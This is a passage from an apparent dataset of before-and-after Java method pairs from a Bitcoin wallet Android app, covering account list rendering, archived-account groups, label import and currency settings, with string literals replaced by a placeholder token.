        if (itemSelectListener != null) {
          itemSelectListener.onClick(account);
        }
      }
    }
);
    accountHolder.llAddress.setOnClickListener(new View.OnClickListener(){
      @Override public void onClick(      View view){
        setFocusedAccount(account);
        if (itemClickListener != null) {
          itemClickListener.onItemClick(account);
        }
      }
    }
);
  }
 else   if (viewType == GROUP_TITLE_TYPE || viewType == GROUP_ARCHIVED_TITLE_TYPE) {
    GroupTitleViewHolder groupHolder=(GroupTitleViewHolder)holder;
    groupHolder.tvTitle.setText(Html.fromHtml(item.title));
    int count=item.walletAccountList.size();
    groupHolder.tvAccountsCount.setVisibility(count > 0 ? View.VISIBLE : View.GONE);
    groupHolder.tvAccountsCount.setText(""String_Node_Str"" + count + ""String_Node_Str"");
    groupHolder.itemView.setOnClickListener(new View.OnClickListener(){
      @Override public void onClick(      View view){
        boolean isGroupVisible=!pagePrefs.getBoolean(item.title,true);
        pagePrefs.edit().putBoolean(item.title,isGroupVisible).apply();
        updateData();
      }
    }
);
    groupHolder.expandIcon.setRotation(pagePrefs.getBoolean(item.title,true) ? 180 : 0);
    if (viewType == GROUP_ARCHIVED_TITLE_TYPE) {
      groupHolder.tvBalance.setVisibility(View.GONE);
    }
 else {
      CurrencySum sum=getSpendableBalance(item.walletAccountList);
      if (sum != null) {
        groupHolder.tvBalance.setValue(sum);
        groupHolder.tvBalance.setVisibility(View.VISIBLE);
      }
 else {
        groupHolder.tvBalance.setVisibility(View.GONE);
      }
    }
  }
 else   if (viewType == TOTAL_BALANCE_TYPE) {
    TotalViewHolder totalHolder=(TotalViewHolder)holder;
    CurrencySum sum=getSpendableBalance(item.walletAccountList);
    if (sum != null) {
      totalHolder.tcdBalance.setValue(sum);
    }
  }
}","@Override public void onBindViewHolder(RecyclerView.ViewHolder holder,int position){
  final Item item=itemList.get(position);
  int viewType=item.type;
  if (viewType == ACCOUNT_TYPE) {
    AccountViewHolder accountHolder=(AccountViewHolder)holder;
    final WalletAccount account=item.walletAccount;
    builder.buildRecordView(null,account,mbwManager.getSelectedAccount() == account,focusedAccount == account,holder.itemView);
    accountHolder.itemView.setOnClickListener(new View.OnClickListener(){
      @Override public void onClick(      View view){
        setFocusedAccount(account);
        if (itemSelectListener != null) {
          itemSelectListener.onClick(account);
        }
      }
    }
);
    accountHolder.llAddress.setOnClickListener(new View.OnClickListener(){
      @Override public void onClick(      View view){
        setFocusedAccount(account);
        if (itemClickListener != null) {
          itemClickListener.onItemClick(account);
        }
      }
    }
);
  }
 else   if (viewType == GROUP_TITLE_TYPE) {
    GroupTitleViewHolder groupHolder=(GroupTitleViewHolder)holder;
    groupHolder.tvTitle.setText(Html.fromHtml(item.title));
    int count=item.walletAccountList.size();
    groupHolder.tvAccountsCount.setVisibility(count > 0 ? View.VISIBLE : View.GONE);
    groupHolder.tvAccountsCount.setText(""String_Node_Str"" + count + ""String_Node_Str"");
    groupHolder.itemView.setOnClickListener(new View.OnClickListener(){
      @Override public void onClick(      View view){
        boolean isGroupVisible=!pagePrefs.getBoolean(item.title,true);
        pagePrefs.edit().putBoolean(item.title,isGroupVisible).apply();
        updateData();
      }
    }
);
    groupHolder.expandIcon.setRotation(pagePrefs.getBoolean(item.title,true) ? 180 : 0);
    CurrencySum sum=getSpendableBalance(item.walletAccountList);
    if (sum != null) {
      groupHolder.tvBalance.setValue(sum);
      groupHolder.tvBalance.setVisibility(View.VISIBLE);
    }
 else {
      groupHolder.tvBalance.setVisibility(View.GONE);
    }
  }
 else   if (viewType == GROUP_ARCHIVED_TITLE_TYPE) {
    ArchivedGroupTitleViewHolder groupHolder=(ArchivedGroupTitleViewHolder)holder;
    groupHolder.tvTitle.setText(Html.fromHtml(item.title));
    int count=item.walletAccountList.size();
    groupHolder.tvAccountsCount.setVisibility(count > 0 ? View.VISIBLE : View.GONE);
    groupHolder.tvAccountsCount.setText(""String_Node_Str"" + count + ""String_Node_Str"");
    groupHolder.itemView.setOnClickListener(new View.OnClickListener(){
      @Override public void onClick(      View view){
        boolean isGroupVisible=!pagePrefs.getBoolean(item.title,true);
        pagePrefs.edit().putBoolean(item.title,isGroupVisible).apply();
        updateData();
      }
    }
);
  }
 else   if (viewType == TOTAL_BALANCE_TYPE) {
    TotalViewHolder totalHolder=(TotalViewHolder)holder;
    CurrencySum sum=getSpendableBalance(item.walletAccountList);
    if (sum != null) {
      totalHolder.tcdBalance.setValue(sum);
    }
  }
}"
91078,"public void importLabelsToBch(WalletManager walletManager){
  if (getSpvBchFetcher() == null)   return;
  for (  WalletAccount walletAccount : walletManager.getActiveAccounts()) {
    if (walletAccount.getType() == WalletAccount.Type.BTCSINGLEADDRESS || walletAccount.getType() == WalletAccount.Type.BTCBIP44) {
      UUID bchId=UUID.nameUUIDFromBytes((""String_Node_Str"" + walletAccount.getId().toString()).getBytes());
      String bchLabel=getMetadataStorage().getLabelByAccount(bchId);
      if (bchLabel == null || bchLabel.isEmpty()) {
        getMetadataStorage().storeAccountLabel(bchId,getMetadataStorage().getLabelByAccount(walletAccount.getId()));
      }
    }
  }
}","public void importLabelsToBch(WalletManager walletManager){
  if (getSpvBchFetcher() == null)   return;
  List<WalletAccount> accounts=new ArrayList<>();
  accounts.addAll(walletManager.getActiveAccounts());
  accounts.addAll(walletManager.getArchivedAccounts());
  for (  WalletAccount walletAccount : accounts) {
    if (walletAccount.getType() == WalletAccount.Type.BTCSINGLEADDRESS || walletAccount.getType() == WalletAccount.Type.BTCBIP44) {
      UUID bchId=UUID.nameUUIDFromBytes((""String_Node_Str"" + walletAccount.getId().toString()).getBytes());
      String bchLabel=getMetadataStorage().getLabelByAccount(bchId);
      if (bchLabel == null || bchLabel.isEmpty()) {
        getMetadataStorage().storeAccountLabel(bchId,getMetadataStorage().getLabelByAccount(walletAccount.getId()));
      }
    }
  }
}"
91079,"public static boolean showLegacyAccountWarning(WalletAccount account,MbwManager mbwManager){
  if (account.isArchived()) {
    return false;
  }
  Balance balance=account.getBalance();
  return account instanceof SingleAddressAccount && balance.getReceivingBalance() + balance.getSpendableBalance() > 0 && account.canSpend() && !mbwManager.getMetadataStorage().getIgnoreLegacyWarning(account.getId());
}","public static boolean showLegacyAccountWarning(WalletAccount account,MbwManager mbwManager){
  if (account.isArchived()) {
    return false;
  }
  Balance balance=account.getBalance();
  return account.getType() == WalletAccount.Type.BTCSINGLEADDRESS && balance.getReceivingBalance() + balance.getSpendableBalance() > 0 && account.canSpend() && !mbwManager.getMetadataStorage().getIgnoreLegacyWarning(account.getId());
}"
91080,"public View buildRecordView(ViewGroup parent,WalletAccount walletAccount,boolean isSelected,boolean hasFocus,View convertView){
  View rowView=convertView;
  if (rowView == null) {
    rowView=inflater.inflate(R.layout.record_row,parent,false);
  }
  if (!isSelected) {
    Utils.setAlpha(rowView,0.5f);
  }
 else {
    Utils.setAlpha(rowView,1f);
  }
  int textColor=resources.getColor(R.color.white);
  if (hasFocus) {
    rowView.setBackgroundColor(resources.getColor(R.color.selectedrecord));
  }
 else {
    rowView.setBackgroundColor(resources.getColor(R.color.transparent));
  }
  ImageView icon=(ImageView)rowView.findViewById(R.id.ivIcon);
  Drawable drawableForAccount=Utils.getDrawableForAccount(walletAccount,isSelected,resources);
  if (drawableForAccount == null) {
    icon.setVisibility(View.INVISIBLE);
  }
 else {
    icon.setVisibility(View.VISIBLE);
    icon.setImageDrawable(drawableForAccount);
  }
  TextView tvLabel=((TextView)rowView.findViewById(R.id.tvLabel));
  TextView tvWhatIsIt=((TextView)rowView.findViewById(R.id.tvWhatIsIt));
  String name=mbwManager.getMetadataStorage().getLabelByAccount(walletAccount.getId());
  WalletAccount linked=Utils.getLinkedAccount(walletAccount,mbwManager.getColuManager().getAccounts().values());
  if (linked != null && linked instanceof ColuAccount && ((ColuAccount)linked).getColuAsset().assetType == ColuAccount.ColuAssetType.RMC) {
    tvWhatIsIt.setOnClickListener(new View.OnClickListener(){
      @Override public void onClick(      View view){
        new AlertDialog.Builder(view.getContext()).setMessage(resources.getString(R.string.rmc_bitcoin_acc_what_is_it)).setPositiveButton(R.string.button_ok,null).create().show();
      }
    }
);
    tvWhatIsIt.setVisibility(View.VISIBLE);
  }
 else {
    tvWhatIsIt.setVisibility(View.GONE);
  }
  if (name.length() == 0) {
    rowView.findViewById(R.id.tvLabel).setVisibility(View.GONE);
  }
 else {
    tvLabel.setVisibility(View.VISIBLE);
    tvLabel.setText(Html.fromHtml(name));
    tvLabel.setTextColor(textColor);
  }
  String displayAddress;
  if (walletAccount.isActive()) {
    if (walletAccount instanceof Bip44PubOnlyAccount) {
      int numKeys=((Bip44Account)walletAccount).getPrivateKeyCount();
      if (numKeys > 1) {
        displayAddress=resources.getString(R.string.contains_addresses,Integer.toString(numKeys));
      }
 else {
        displayAddress=resources.getString(R.string.account_contains_one_address_info);
      }
    }
 else     if (walletAccount instanceof Bip44Account) {
      int numKeys=((Bip44Account)walletAccount).getPrivateKeyCount();
      if (numKeys > 1) {
        displayAddress=resources.getString(R.string.contains_keys,Integer.toString(numKeys));
      }
 else {
        displayAddress=resources.getString(R.string.account_contains_one_key_info);
      }
    }
 else {
      Optional<Address> receivingAddress=walletAccount.getReceivingAddress();
      if (receivingAddress.isPresent()) {
        if (name.length() == 0) {
          displayAddress=receivingAddress.get().toMultiLineString();
        }
 else {
          displayAddress=receivingAddress.get().getShortAddress();
        }
      }
 else {
        displayAddress=""String_Node_Str"";
      }
    }
  }
 else {
    displayAddress=""String_Node_Str"";
  }
  TextView tvAddress=((TextView)rowView.findViewById(R.id.tvAddress));
  tvAddress.setText(displayAddress);
  tvAddress.setTextColor(textColor);
  rowView.setTag(walletAccount);
  if (walletAccount.isActive()) {
    CurrencyBasedBalance balance=walletAccount.getCurrencyBasedBalance();
    rowView.findViewById(R.id.tvBalance).setVisibility(View.VISIBLE);
    String balanceString=Utils.getFormattedValueWithUnit(balance.confirmed,mbwManager.getBitcoinDenomination());
    if (walletAccount instanceof ColuAccount) {
      balanceString=Utils.getColuFormattedValueWithUnit(walletAccount.getCurrencyBasedBalance().confirmed);
    }
    TextView tvBalance=((TextView)rowView.findViewById(R.id.tvBalance));
    tvBalance.setText(balanceString);
    tvBalance.setTextColor(textColor);
    boolean showLegacyAccountWarning=showLegacyAccountWarning(walletAccount,mbwManager);
    rowView.findViewById(R.id.tvLegacyAccountWarning).setVisibility(showLegacyAccountWarning ? View.VISIBLE : View.GONE);
    boolean showBackupMissingWarning=showBackupMissingWarning(walletAccount,mbwManager);
    TextView backupMissing=rowView.findViewById(R.id.tvBackupMissingWarning);
    backupMissing.setVisibility(showBackupMissingWarning ? View.VISIBLE : View.GONE);
    if (mbwManager.getMetadataStorage().getOtherAccountBackupState(walletAccount.getId()) == MetadataStorage.BackupState.NOT_VERIFIED) {
      backupMissing.setText(R.string.backup_not_verified);
    }
 else {
      backupMissing.setText(R.string.backup_missing);
    }
  }
 else {
    rowView.findViewById(R.id.tvBalance).setVisibility(View.GONE);
    rowView.findViewById(R.id.tvBackupMissingWarning).setVisibility(View.GONE);
  }
  if (walletAccount.getId().equals(mbwManager.getLocalTraderManager().getLocalTraderAccountId())) {
    rowView.findViewById(R.id.tvTraderKey).setVisibility(View.VISIBLE);
  }
 else {
    rowView.findViewById(R.id.tvTraderKey).setVisibility(View.GONE);
  }
  return rowView;
}","public View buildRecordView(ViewGroup parent,WalletAccount walletAccount,boolean isSelected,boolean hasFocus,View convertView){
  View rowView=convertView;
  if (rowView == null) {
    rowView=inflater.inflate(R.layout.record_row,parent,false);
  }
  if (!isSelected) {
    Utils.setAlpha(rowView,0.5f);
  }
 else {
    Utils.setAlpha(rowView,1f);
  }
  int textColor=resources.getColor(R.color.white);
  if (hasFocus) {
    rowView.setBackgroundColor(resources.getColor(R.color.selectedrecord));
  }
 else {
    rowView.setBackgroundColor(resources.getColor(R.color.transparent));
  }
  ImageView icon=(ImageView)rowView.findViewById(R.id.ivIcon);
  Drawable drawableForAccount=Utils.getDrawableForAccount(walletAccount,isSelected,resources);
  if (drawableForAccount == null) {
    icon.setVisibility(View.INVISIBLE);
  }
 else {
    icon.setVisibility(View.VISIBLE);
    icon.setImageDrawable(drawableForAccount);
  }
  TextView tvLabel=((TextView)rowView.findViewById(R.id.tvLabel));
  TextView tvWhatIsIt=((TextView)rowView.findViewById(R.id.tvWhatIsIt));
  String name=mbwManager.getMetadataStorage().getLabelByAccount(walletAccount.getId());
  WalletAccount linked=Utils.getLinkedAccount(walletAccount,mbwManager.getColuManager().getAccounts().values());
  if (linked != null && linked instanceof ColuAccount && ((ColuAccount)linked).getColuAsset().assetType == ColuAccount.ColuAssetType.RMC) {
    tvWhatIsIt.setOnClickListener(new View.OnClickListener(){
      @Override public void onClick(      View view){
        new AlertDialog.Builder(view.getContext()).setMessage(resources.getString(R.string.rmc_bitcoin_acc_what_is_it)).setPositiveButton(R.string.button_ok,null).create().show();
      }
    }
);
    tvWhatIsIt.setVisibility(View.VISIBLE);
  }
 else {
    tvWhatIsIt.setVisibility(View.GONE);
  }
  if (name.length() == 0) {
    rowView.findViewById(R.id.tvLabel).setVisibility(View.GONE);
  }
 else {
    tvLabel.setVisibility(View.VISIBLE);
    tvLabel.setText(Html.fromHtml(name));
    tvLabel.setTextColor(textColor);
  }
  String displayAddress;
  if (walletAccount.isActive()) {
    if (walletAccount instanceof Bip44PubOnlyAccount) {
      int numKeys=((Bip44Account)walletAccount).getPrivateKeyCount();
      if (numKeys > 1) {
        displayAddress=resources.getString(R.string.contains_addresses,Integer.toString(numKeys));
      }
 else {
        displayAddress=resources.getString(R.string.account_contains_one_address_info);
      }
    }
 else     if (walletAccount instanceof Bip44Account) {
      int numKeys=((Bip44Account)walletAccount).getPrivateKeyCount();
      if (numKeys > 1) {
        displayAddress=resources.getString(R.string.contains_keys,Integer.toString(numKeys));
      }
 else {
        displayAddress=resources.getString(R.string.account_contains_one_key_info);
      }
    }
 else {
      Optional<Address> receivingAddress=walletAccount.getReceivingAddress();
      if (receivingAddress.isPresent()) {
        if (name.length() == 0) {
          displayAddress=receivingAddress.get().toMultiLineString();
        }
 else {
          displayAddress=receivingAddress.get().getShortAddress();
        }
      }
 else {
        displayAddress=""String_Node_Str"";
      }
    }
  }
 else {
    displayAddress=""String_Node_Str"";
  }
  TextView tvAddress=((TextView)rowView.findViewById(R.id.tvAddress));
  tvAddress.setText(displayAddress);
  tvAddress.setTextColor(textColor);
  rowView.setTag(walletAccount);
  if (walletAccount.isActive()) {
    CurrencyBasedBalance balance=walletAccount.getCurrencyBasedBalance();
    rowView.findViewById(R.id.tvBalance).setVisibility(View.VISIBLE);
    String balanceString=Utils.getFormattedValueWithUnit(balance.confirmed,mbwManager.getBitcoinDenomination());
    if (walletAccount instanceof ColuAccount) {
      balanceString=Utils.getColuFormattedValueWithUnit(walletAccount.getCurrencyBasedBalance().confirmed);
    }
    TextView tvBalance=((TextView)rowView.findViewById(R.id.tvBalance));
    tvBalance.setText(balanceString);
    tvBalance.setTextColor(textColor);
    boolean showLegacyAccountWarning=showLegacyAccountWarning(walletAccount,mbwManager);
    rowView.findViewById(R.id.tvLegacyAccountWarning).setVisibility(showLegacyAccountWarning ? View.VISIBLE : View.GONE);
    boolean showBackupMissingWarning=showBackupMissingWarning(walletAccount,mbwManager);
    TextView backupMissing=rowView.findViewById(R.id.tvBackupMissingWarning);
    backupMissing.setVisibility(showBackupMissingWarning ? View.VISIBLE : View.GONE);
    if (mbwManager.getMetadataStorage().getOtherAccountBackupState(walletAccount.getId()) == MetadataStorage.BackupState.NOT_VERIFIED) {
      backupMissing.setText(R.string.backup_not_verified);
    }
 else {
      backupMissing.setText(R.string.backup_missing);
    }
  }
 else {
    rowView.findViewById(R.id.tvBalance).setVisibility(View.GONE);
    rowView.findViewById(R.id.tvLegacyAccountWarning).setVisibility(View.GONE);
    rowView.findViewById(R.id.tvBackupMissingWarning).setVisibility(View.GONE);
  }
  if (walletAccount.getId().equals(mbwManager.getLocalTraderManager().getLocalTraderAccountId())) {
    rowView.findViewById(R.id.tvTraderKey).setVisibility(View.VISIBLE);
  }
 else {
    rowView.findViewById(R.id.tvTraderKey).setVisibility(View.GONE);
  }
  return rowView;
}"
91081,"@Override public RecyclerView.ViewHolder onCreateViewHolder(ViewGroup parent,int viewType){
  RecyclerView.ViewHolder result=null;
  if (viewType == GROUP_TITLE_TYPE || viewType == GROUP_ARCHIVED_TITLE_TYPE) {
    View view=layoutInflater.inflate(R.layout.accounts_title_view,parent,false);
    GroupTitleViewHolder res=new GroupTitleViewHolder(view);
    res.tvBalance.setEventBus(mbwManager.getEventBus());
    res.tvBalance.setCurrencySwitcher(mbwManager.getCurrencySwitcher());
    result=res;
  }
 else   if (viewType == ACCOUNT_TYPE) {
    View view=layoutInflater.inflate(R.layout.record_row,parent,false);
    result=new AccountViewHolder(view);
  }
 else   if (viewType == TOTAL_BALANCE_TYPE) {
    View view=layoutInflater.inflate(R.layout.record_row_total,parent,false);
    TotalViewHolder res=new TotalViewHolder(view);
    res.tcdBalance.setCurrencySwitcher(mbwManager.getCurrencySwitcher());
    res.tcdBalance.setEventBus(mbwManager.getEventBus());
    result=res;
  }
  return result;
}","@Override public RecyclerView.ViewHolder onCreateViewHolder(ViewGroup parent,int viewType){
  RecyclerView.ViewHolder result=null;
  if (viewType == GROUP_TITLE_TYPE) {
    View view=layoutInflater.inflate(R.layout.accounts_title_view,parent,false);
    GroupTitleViewHolder res=new GroupTitleViewHolder(view);
    res.tvBalance.setEventBus(mbwManager.getEventBus());
    res.tvBalance.setCurrencySwitcher(mbwManager.getCurrencySwitcher());
    result=res;
  }
 else   if (viewType == GROUP_ARCHIVED_TITLE_TYPE) {
    View view=layoutInflater.inflate(R.layout.accounts_archived_title_view,parent,false);
    result=new ArchivedGroupTitleViewHolder(view);
  }
 else   if (viewType == ACCOUNT_TYPE) {
    View view=layoutInflater.inflate(R.layout.record_row,parent,false);
    result=new AccountViewHolder(view);
  }
 else   if (viewType == TOTAL_BALANCE_TYPE) {
    View view=layoutInflater.inflate(R.layout.record_row_total,parent,false);
    TotalViewHolder res=new TotalViewHolder(view);
    res.tcdBalance.setCurrencySwitcher(mbwManager.getCurrencySwitcher());
    res.tcdBalance.setEventBus(mbwManager.getEventBus());
    result=res;
  }
  return result;
}"
91082,"@Override public void onBindViewHolder(RecyclerView.ViewHolder holder,int position){
  final Item item=itemList.get(position);
  int viewType=item.type;
  if (viewType == ACCOUNT_TYPE) {
    AccountViewHolder accountHolder=(AccountViewHolder)holder;
    final WalletAccount account=item.walletAccount;
    builder.buildRecordView(null,account,mbwManager.getSelectedAccount() == account,focusedAccount == account,holder.itemView);
    accountHolder.itemView.setOnClickListener(new View.OnClickListener(){
      @Override public void onClick(      View view){
        setFocusedAccount(account);
        if (itemSelectListener != null) {
          itemSelectListener.onClick(account);
        }
      }
    }
);
    accountHolder.llAddress.setOnClickListener(new View.OnClickListener(){
      @Override public void onClick(      View view){
        setFocusedAccount(account);
        if (itemClickListener != null) {
          itemClickListener.onItemClick(account);
        }
      }
    }
);
  }
 else   if (viewType == GROUP_TITLE_TYPE || viewType == GROUP_ARCHIVED_TITLE_TYPE) {
    GroupTitleViewHolder groupHolder=(GroupTitleViewHolder)holder;
    groupHolder.tvTitle.setText(Html.fromHtml(item.title));
    int count=item.walletAccountList.size();
    groupHolder.tvAccountsCount.setVisibility(count > 0 ? View.VISIBLE : View.GONE);
    groupHolder.tvAccountsCount.setText(""String_Node_Str"" + count + ""String_Node_Str"");
    groupHolder.itemView.setOnClickListener(new View.OnClickListener(){
      @Override public void onClick(      View view){
        boolean isGroupVisible=!pagePrefs.getBoolean(item.title,true);
        pagePrefs.edit().putBoolean(item.title,isGroupVisible).apply();
        updateData();
      }
    }
);
    groupHolder.expandIcon.setRotation(pagePrefs.getBoolean(item.title,true) ? 180 : 0);
    if (viewType == GROUP_ARCHIVED_TITLE_TYPE) {
      groupHolder.tvBalance.setVisibility(View.GONE);
    }
 else {
      CurrencySum sum=getSpendableBalance(item.walletAccountList);
      if (sum != null) {
        groupHolder.tvBalance.setValue(sum);
        groupHolder.tvBalance.setVisibility(View.VISIBLE);
      }
 else {
        groupHolder.tvBalance.setVisibility(View.GONE);
      }
    }
  }
 else   if (viewType == TOTAL_BALANCE_TYPE) {
    TotalViewHolder totalHolder=(TotalViewHolder)holder;
    CurrencySum sum=getSpendableBalance(item.walletAccountList);
    if (sum != null) {
      totalHolder.tcdBalance.setValue(sum);
    }
  }
}","@Override public void onBindViewHolder(RecyclerView.ViewHolder holder,int position){
  final Item item=itemList.get(position);
  int viewType=item.type;
  if (viewType == ACCOUNT_TYPE) {
    AccountViewHolder accountHolder=(AccountViewHolder)holder;
    final WalletAccount account=item.walletAccount;
    builder.buildRecordView(null,account,mbwManager.getSelectedAccount() == account,focusedAccount == account,holder.itemView);
    accountHolder.itemView.setOnClickListener(new View.OnClickListener(){
      @Override public void onClick(      View view){
        setFocusedAccount(account);
        if (itemSelectListener != null) {
          itemSelectListener.onClick(account);
        }
      }
    }
);
    accountHolder.llAddress.setOnClickListener(new View.OnClickListener(){
      @Override public void onClick(      View view){
        setFocusedAccount(account);
        if (itemClickListener != null) {
          itemClickListener.onItemClick(account);
        }
      }
    }
);
  }
 else   if (viewType == GROUP_TITLE_TYPE) {
    GroupTitleViewHolder groupHolder=(GroupTitleViewHolder)holder;
    groupHolder.tvTitle.setText(Html.fromHtml(item.title));
    int count=item.walletAccountList.size();
    groupHolder.tvAccountsCount.setVisibility(count > 0 ? View.VISIBLE : View.GONE);
    groupHolder.tvAccountsCount.setText(""String_Node_Str"" + count + ""String_Node_Str"");
    groupHolder.itemView.setOnClickListener(new View.OnClickListener(){
      @Override public void onClick(      View view){
        boolean isGroupVisible=!pagePrefs.getBoolean(item.title,true);
        pagePrefs.edit().putBoolean(item.title,isGroupVisible).apply();
        updateData();
      }
    }
);
    groupHolder.expandIcon.setRotation(pagePrefs.getBoolean(item.title,true) ? 180 : 0);
    CurrencySum sum=getSpendableBalance(item.walletAccountList);
    if (sum != null) {
      groupHolder.tvBalance.setValue(sum);
      groupHolder.tvBalance.setVisibility(View.VISIBLE);
    }
 else {
      groupHolder.tvBalance.setVisibility(View.GONE);
    }
  }
 else   if (viewType == GROUP_ARCHIVED_TITLE_TYPE) {
    ArchivedGroupTitleViewHolder groupHolder=(ArchivedGroupTitleViewHolder)holder;
    groupHolder.tvTitle.setText(Html.fromHtml(item.title));
    int count=item.walletAccountList.size();
    groupHolder.tvAccountsCount.setVisibility(count > 0 ? View.VISIBLE : View.GONE);
    groupHolder.tvAccountsCount.setText(""String_Node_Str"" + count + ""String_Node_Str"");
    groupHolder.itemView.setOnClickListener(new View.OnClickListener(){
      @Override public void onClick(      View view){
        boolean isGroupVisible=!pagePrefs.getBoolean(item.title,true);
        pagePrefs.edit().putBoolean(item.title,isGroupVisible).apply();
        updateData();
      }
    }
);
  }
 else   if (viewType == TOTAL_BALANCE_TYPE) {
    TotalViewHolder totalHolder=(TotalViewHolder)holder;
    CurrencySum sum=getSpendableBalance(item.walletAccountList);
    if (sum != null) {
      totalHolder.tcdBalance.setValue(sum);
    }
  }
}"
91083,"public void setDefaultCurrency(String currencyLabel){
  Set<String> currencies=new HashSet<>(getCurrencyList());
  if (!defaultCurrency.equals(currencyLabel)) {
    currencies.remove(defaultCurrency);
    currencies.add(currencyLabel);
  }
  setCurrencyList(currencies);
  defaultCurrency=currencyLabel;
}","public void setDefaultCurrency(String currencyLabel){
  Set<String> currencies=new HashSet<>(getCurrencyList());
  if (!defaultCurrency.equals(currencyLabel)) {
    currencies.remove(defaultCurrency);
    currencies.add(currencyLabel);
  }
  defaultCurrency=currencyLabel;
}"
91084,"public void setCurrencyList(final Set<String> fiatCurrencies){
  ArrayList<String> currencies=Lists.newArrayList(fiatCurrencies);
  Collections.sort(currencies);
  if (!currencies.contains(currentFiatCurrency)) {
    if (currencies.isEmpty()) {
      setCurrency(""String_Node_Str"");
    }
 else {
      setCurrency(currencies.get(0));
    }
  }
  this.fiatCurrencies=new ArrayList<String>(currencies);
}","public void setCurrencyList(final Set<String> fiatCurrencies){
  ArrayList<String> currencies=Lists.newArrayList(fiatCurrencies);
  Collections.sort(currencies);
  if (!currencies.contains(currentFiatCurrency)) {
    if (currencies.isEmpty()) {
      setCurrency(""String_Node_Str"");
    }
 else {
      setCurrency(currencies.get(0));
    }
  }
  this.fiatCurrencies=new ArrayList<>(currencies);
}"
91085,"private MbwManager(Context evilContext){
  _applicationContext=Preconditions.checkNotNull(evilContext.getApplicationContext());
  _environment=MbwEnvironment.verifyEnvironment();
  String version=VersionManager.determineVersion(_applicationContext);
  SharedPreferences preferences=getPreferences();
  _eventBus=new Bus();
  _eventBus.register(this);
  try {
    setTorMode(ServerEndpointType.Types.valueOf(preferences.getString(Constants.TOR_MODE,""String_Node_Str"")));
  }
 catch (  IllegalArgumentException ex) {
    setTorMode(ServerEndpointType.Types.ONLY_HTTPS);
  }
  _wapi=initWapi();
  _httpErrorCollector=HttpErrorCollector.registerInVM(_applicationContext,_wapi);
  _randomSource=new AndroidRandomSource();
  TradeSessionDb tradeSessionDb=new TradeSessionDb(_applicationContext);
  _ltApi=initLt();
  _localTraderManager=new LocalTraderManager(_applicationContext,tradeSessionDb,getLtApi(),this);
  _pin=new Pin(preferences.getString(Constants.PIN_SETTING,""String_Node_Str""),preferences.getString(Constants.PIN_SETTING_RESETTABLE,""String_Node_Str"").equals(""String_Node_Str""));
  _pinRequiredOnStartup=preferences.getBoolean(Constants.PIN_SETTING_REQUIRED_ON_STARTUP,false);
  _minerFee=MinerFee.fromString(preferences.getString(Constants.MINER_FEE_SETTING,MinerFee.NORMAL.toString()));
  _enableContinuousFocus=preferences.getBoolean(Constants.ENABLE_CONTINUOUS_FOCUS_SETTING,false);
  _keyManagementLocked=preferences.getBoolean(Constants.KEY_MANAGEMENT_LOCKED_SETTING,false);
  DisplayMetrics dm=new DisplayMetrics();
  WindowManager windowManager=(WindowManager)_applicationContext.getSystemService(Context.WINDOW_SERVICE);
  windowManager.getDefaultDisplay().getMetrics(dm);
  _storage=new MetadataStorage(_applicationContext);
  _language=preferences.getString(Constants.LANGUAGE_SETTING,Locale.getDefault().getLanguage());
  _versionManager=new VersionManager(_applicationContext,_language,new AndroidAsyncApi(_wapi,_eventBus),version,_eventBus);
  Set<String> currencyList=getPreferences().getStringSet(Constants.SELECTED_CURRENCIES,null);
  Set<String> fiatCurrencies=new HashSet<>();
  if (currencyList == null) {
    fiatCurrencies.add(Constants.DEFAULT_CURRENCY);
  }
 else {
    fiatCurrencies.addAll(currencyList);
  }
  _exchangeRateManager=new ExchangeRateManager(_applicationContext,_wapi,getNetwork(),getMetadataStorage());
  _currencySwitcher=new CurrencySwitcher(_exchangeRateManager,fiatCurrencies,getPreferences().getString(Constants.FIAT_CURRENCY_SETTING,Constants.DEFAULT_CURRENCY),Denomination.fromString(preferences.getString(Constants.BITCOIN_DENOMINATION_SETTING,Denomination.BTC.toString())));
  ActivityManager am=(ActivityManager)_applicationContext.getSystemService(Context.ACTIVITY_SERVICE);
  int memoryClass=am.getMemoryClass();
  _deviceScryptParameters=memoryClass > 20 ? MrdExport.V1.ScryptParameters.DEFAULT_PARAMS : MrdExport.V1.ScryptParameters.LOW_MEM_PARAMS;
  _trezorManager=new TrezorManager(_applicationContext,getNetwork(),getEventBus());
  _keepkeyManager=new KeepKeyManager(_applicationContext,getNetwork(),getEventBus());
  _ledgerManager=new LedgerManager(_applicationContext,getNetwork(),getEventBus());
  _walletManager=createWalletManager(_applicationContext,_environment);
  _eventTranslator=new EventTranslator(new Handler(),_eventBus);
  _exchangeRateManager.subscribe(_eventTranslator);
  _walletManager.addObserver(_eventTranslator);
  _coinapultManager=createCoinapultManager();
  if (_coinapultManager.isPresent()) {
    addExtraAccounts(_coinapultManager.get());
  }
  new InitColuManagerTask().execute();
  setCurrencyList(fiatCurrencies);
  migrateOldKeys();
  createTempWalletManager();
  _versionManager.initBackgroundVersionChecker();
  _blockExplorerManager=new BlockExplorerManager(this,_environment.getBlockExplorerList(),getPreferences().getString(Constants.BLOCK_EXPLORER,_environment.getBlockExplorerList().get(0).getIdentifier()));
}","private MbwManager(Context evilContext){
  _applicationContext=Preconditions.checkNotNull(evilContext.getApplicationContext());
  _environment=MbwEnvironment.verifyEnvironment();
  String version=VersionManager.determineVersion(_applicationContext);
  SharedPreferences preferences=getPreferences();
  _eventBus=new Bus();
  _eventBus.register(this);
  try {
    setTorMode(ServerEndpointType.Types.valueOf(preferences.getString(Constants.TOR_MODE,""String_Node_Str"")));
  }
 catch (  IllegalArgumentException ex) {
    setTorMode(ServerEndpointType.Types.ONLY_HTTPS);
  }
  _wapi=initWapi();
  _httpErrorCollector=HttpErrorCollector.registerInVM(_applicationContext,_wapi);
  _randomSource=new AndroidRandomSource();
  TradeSessionDb tradeSessionDb=new TradeSessionDb(_applicationContext);
  _ltApi=initLt();
  _localTraderManager=new LocalTraderManager(_applicationContext,tradeSessionDb,getLtApi(),this);
  _pin=new Pin(preferences.getString(Constants.PIN_SETTING,""String_Node_Str""),preferences.getString(Constants.PIN_SETTING_RESETTABLE,""String_Node_Str"").equals(""String_Node_Str""));
  _pinRequiredOnStartup=preferences.getBoolean(Constants.PIN_SETTING_REQUIRED_ON_STARTUP,false);
  _minerFee=MinerFee.fromString(preferences.getString(Constants.MINER_FEE_SETTING,MinerFee.NORMAL.toString()));
  _enableContinuousFocus=preferences.getBoolean(Constants.ENABLE_CONTINUOUS_FOCUS_SETTING,false);
  _keyManagementLocked=preferences.getBoolean(Constants.KEY_MANAGEMENT_LOCKED_SETTING,false);
  DisplayMetrics dm=new DisplayMetrics();
